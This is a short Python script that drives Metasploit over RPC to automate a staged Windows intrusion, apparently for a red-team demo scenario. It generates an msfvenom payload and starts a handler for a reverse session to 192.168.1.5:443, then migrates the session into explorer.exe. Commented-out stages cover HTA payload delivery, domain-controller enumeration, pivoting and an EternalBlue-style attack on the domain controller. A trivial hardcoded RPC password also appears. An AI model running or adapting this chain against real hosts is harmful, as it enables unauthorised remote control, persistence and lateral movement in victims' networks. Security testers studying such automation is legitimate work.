from time import sleep
import library.msf_session_list as session_list
from library.pymetasploit3.msfrpc import MsfRpcClient
#import stage2.payloadDelivery.multi.mshta as mshta
import stage2.payloadDelivery.multi.msfvenom as msfvenom
#import stage3.internalReconnaissance.windows.enumdom as enumdom
import stage3.internalC2.windows.migrate64 as migrate64
#import stage3.internalC2.multi.pivot as pivot
#import stage3.privilegeEscalation.windows.ebwin8 as EB

#os.system('./init.sh')
#sleep(20)
client = MsfRpcClient("123",port=55552)

def main():
    
    # INITIALISING THE REQUIRED COMPONENT IN THE DEMO: HTA LINK, DOMAIN CONTROLLER
    link = ''
    dc = ''

    #Stage2: creating and delivering payload to victim via hta server
    #link = mshta.init(client)
    
    #Stage3: Enumerate domain controller and create a pivot
    #dc = enumdom.init(client,sid)
    #pivip = pivot.init(client,sid)

    #Attacking the domain controller
    #EB.init(client,dc) 
    #dcid = session_list.init(client, ip= dc)

    #YJ Stage 2
    #Create msfvenom exe and start handler
    msfvenom.init(client) 
    sid = session_list.init(client, lhost='192.168.1.5:443')

    #YJ Stage 3
    #Migrate to explorer.exe
    migrate64.init(client,sid)
    #for id,c in client.sessions.list.items():
    #    print("{})".format(id),"IP: {}".format(c.get('session_host')),"| {}".format(c.get('desc')),"{}".format(c.get('arch')))

print("[*][*] THIS PROGRAM IS AN AUTOMATION BASED ON THE SCENARIO SHOWN [*][*]")
sleep(3)
main()